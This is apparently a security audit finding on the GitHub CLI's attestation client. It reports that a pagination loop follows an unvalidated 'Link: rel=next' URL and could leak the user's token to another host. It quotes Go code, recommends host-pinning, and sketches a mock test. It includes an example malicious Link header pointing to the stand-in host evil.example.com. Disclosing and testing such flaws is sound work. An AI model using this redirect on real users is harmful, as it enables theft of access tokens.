### Title
Cross-host token leakage via unvalidated `Link: rel="next"` pagination URL in attestation fetch loop - ([File: pkg/cmd/attestation/api/client.go])

### Summary
`LiveClient.getAttestations` follows the `next` pagination URL returned in the GitHub REST API response's `Link` header without validating that it points back to `c.host`. Because the `next` value is taken verbatim from an attacker-influenced HTTP response and re-used as the request path on the next loop iteration, a malicious/compromised GHES tenant or any host the victim points `gh` at for `verify-asset`/attestation verification can redirect subsequent authenticated calls to an attacker-controlled origin.

### Finding Description
In `getAttestations`, the pagination loop is: [1](#0-0) 

`newURL` comes straight from `RESTWithNext`, which parses the `Link` header of the HTTP response body and extracts the `rel="next"` target with no host/scheme validation: [2](#0-1) 

That value is then wrapped with `safeurl.NewImmutableSafeURL(newURL)` — used elsewhere in this same file specifically to wrap externally-supplied absolute URLs such as `a.BundleURL` for blob storage fetches, i.e. by design it does **not** enforce a host allowlist the way `safeurl.JoinPath` does for `c.host`-scoped requests: [3](#0-2) 

The reassigned `pageURL` is fed back into `c.githubAPI.RESTWithNext(c.host, http.MethodGet, pageURL.String(), nil, &resp)` on the next loop iteration. `hostname` (`c.host`) is only used to configure the REST client's transport (including the Authorization header), while the actual request destination is `p` (`pageURL.String()`), per `Client.RESTWithNext`: [4](#0-3) 

The library's request path-building (in the vendored `go-gh` REST client, not part of this repo's index) is documented to pass through absolute `http(s)://` paths unchanged rather than re-joining them to the configured host — this is the standard mechanism that lets GitHub's own pagination Link headers work. Because the authenticated `http.Client` built by `clientOptions(hostname, ...)` attaches the bearer token transport-wide (per client instance), rather than checking the resolved request host per call, an absolute cross-host `next` URL causes the token to be sent to that foreign host. I was not able to re-verify the exact `go-gh` internal implementation from this repo's index since it is a vendored external dependency and not indexed here, but the application-level gap is clear and independent of that detail: `getAttestations` never checks that `newURL`'s host equals `c.host` before continuing the loop, despite the codebase having a `safeurl` package specifically meant to enforce host-pinning.

Attacker path: an attacker who controls the attestations API response for a given digest (e.g., a malicious/compromised GHES instance, or any host a victim configures `gh` against, per the threat model) sets the `Link` response header on the first attestations page to `<https://evil.example.com/x>; rel="next"`. The victim's `gh release verify-asset` / attestation-fetch flow then re-dials `https://evil.example.com/x` on the next backoff-wrapped iteration while the request is issued through the same authenticated `http.Client`/transport configured for `c.host`.

### Impact Explanation
If the underlying transport behaves as designed for pagination pass-through (attaching the Authorization header per-client rather than per-resolved-host), this results in exfiltration of the victim's OAuth/PAT token to an attacker-controlled host — a token/credential disclosure impact, and also a wrong-host request routing issue, both explicitly in-scope impact classes for this audit.

### Likelihood Explanation
Requires the attacker to control the content of the attestations API response — a plausible precondition per the stated threat model (malicious GHES tenant or attacker-controlled target host). No user interaction beyond running `gh release verify-asset` against attacker-influenced content is required, and the pagination loop runs automatically as long as fewer than `params.Limit` attestations have been collected, so the malicious `Link` header will reliably be followed.

### Recommendation
In `getAttestations`, after receiving `newURL` from `RESTWithNext`, parse it and validate that its host matches `c.host` (case-insensitively) before reassigning `pageURL` and continuing the loop; abort/return an error otherwise. Prefer routing the `next` URL through `safeurl.JoinPath`-style validation (or an equivalent host-allowlist check) rather than `safeurl.NewImmutableSafeURL`, which is intended for already-external, non-authenticated URLs like blob storage `BundleURL`.

### Proof of Concept
Go test using `httpmock` (pattern already used in `pkg/cmd/attestation/api/client_test.go`):
1. Register a mock responder for the first `GET /repos/{owner}/{repo}/attestations/{digest}` call that returns a valid `AttestationsResponse` body plus header `Link: <https://evil.example.com/next-page>; rel="next"`.
2. Register a second mock responder/transport hook that fails the test (or records the call) if any outbound request is made to `evil.example.com`, and separately assert it carries an `Authorization` header if reached.
3. Call `LiveClient.getAttestations` with `params.Limit` greater than the number of attestations returned on page one.
4. Assert: either (a) the test fails because a request was dialed to `evil.example.com` carrying the `Authorization` header (confirms vulnerability), or (b) `getAttestations` returns an error/stops pagination without dialing the foreign host (confirms the fix is in place).

### Citations

**File:** pkg/cmd/attestation/api/client.go (L155-166)
```go
	for pageURL.String() != "" && len(attestations) < params.Limit {
		err := backoff.Retry(func() error {
			newURL, restErr := c.githubAPI.RESTWithNext(c.host, http.MethodGet, pageURL.String(), nil, &resp)
			if restErr != nil {
				if shouldRetry(restErr) {
					return restErr
				}
				return backoff.Permanent(restErr)
			}

			pageURL = safeurl.NewImmutableSafeURL(newURL)

```

**File:** pkg/cmd/attestation/api/client.go (L216-220)
```go

			// otherwise fetch the bundle with the provided URL
			b, err := c.getBundle(safeurl.NewImmutableSafeURL(a.BundleURL))
			if err != nil {
				return fmt.Errorf("failed to fetch bundle with URL: %w", err)
```

**File:** api/client.go (L113-148)
```go
func (c Client) RESTWithNext(hostname string, method string, p string, body io.Reader, data interface{}) (string, error) {
	opts := clientOptions(hostname, c.http.Transport)
	restClient, err := ghAPI.NewRESTClient(opts)
	if err != nil {
		return "", err
	}

	resp, err := restClient.Request(method, p, body)
	if err != nil {
		return "", handleResponse(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return "", nil
	}

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	err = json.Unmarshal(b, &data)
	if err != nil {
		return "", err
	}

	var next string
	for _, m := range linkRE.FindAllStringSubmatch(resp.Header.Get("Link"), -1) {
		if len(m) > 2 && m[2] == "next" {
			next = m[1]
		}
	}

	return next, nil
}
```
